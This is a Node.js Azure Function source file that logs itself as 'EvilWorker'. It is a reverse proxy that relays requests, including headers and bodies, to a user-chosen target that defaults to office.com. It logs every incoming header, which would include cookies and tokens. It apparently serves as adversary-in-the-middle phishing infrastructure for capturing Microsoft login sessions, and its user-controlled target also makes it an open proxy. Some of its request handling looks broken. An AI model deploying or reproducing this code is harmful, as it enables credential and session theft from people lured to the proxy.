const https = require('https');
const http = require('http');
const url = require('url');

module.exports = async function (context, req) {
    context.log('🚀 EvilWorker Azure Function Started');
    context.log('📋 Request URL:', req.url);
    context.log('📋 Request Method:', req.method);
    context.log('📋 Request Headers:', JSON.stringify(req.headers, null, 2));

    try {
        // Parse the target URL from the request
        const targetUrl = req.query.target || 'https://www.office.com';
        context.log('🎯 Target URL:', targetUrl);

        // Create proxy request
        const parsedUrl = url.parse(targetUrl);
        const options = {
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
            path: parsedUrl.path + (req.url ? req.url : ''),
            method: req.method,
            headers: {
                ...req.headers,
                host: parsedUrl.hostname
            }
        };

        context.log('🔧 Proxy Options:', JSON.stringify(options, null, 2));

        // Make the proxy request
        const proxyReq = (parsedUrl.protocol === 'https:' ? https : http).request(options, (proxyRes) => {
            context.log('✅ Proxy Response Status:', proxyRes.statusCode);
            context.log('✅ Proxy Response Headers:', JSON.stringify(proxyRes.headers, null, 2));

            // Set response headers
            context.res.status = proxyRes.statusCode;
            Object.keys(proxyRes.headers).forEach(key => {
                context.res.setHeader(key, proxyRes.headers[key]);
            });

            // Stream the response
            proxyRes.pipe(context.res);
        });

        proxyReq.on('error', (error) => {
            context.log.error('❌ Proxy Request Error:', error);
            context.res.status = 500;
            context.res.body = `Proxy Error: ${error.message}`;
        });

        // Handle request body for POST/PUT requests
        if (req.body && (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH')) {
            proxyReq.write(req.body);
        }

        proxyReq.end();

    } catch (error) {
        context.log.error('❌ Function Error:', error);
        context.res.status = 500;
        context.res.body = `Function Error: ${error.message}`;
    }
};
